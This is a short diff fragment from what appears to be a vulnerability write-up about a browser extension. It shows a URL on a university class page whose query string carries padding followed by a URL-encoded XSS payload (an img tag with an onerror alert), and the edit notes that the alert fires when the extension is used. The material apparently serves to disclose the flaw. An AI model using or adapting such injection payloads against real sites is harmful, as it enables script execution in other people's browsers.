@@ -66,4 +66,4 @@ The following exploit should work. Visit the following URL, which is the same si
 
 https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%3Cimg%20src=%27x%27%20onerror=%22alert(%27injection%27);%22%3E
 
-An alert message will appear.
+An alert message will appear upon using the extension.
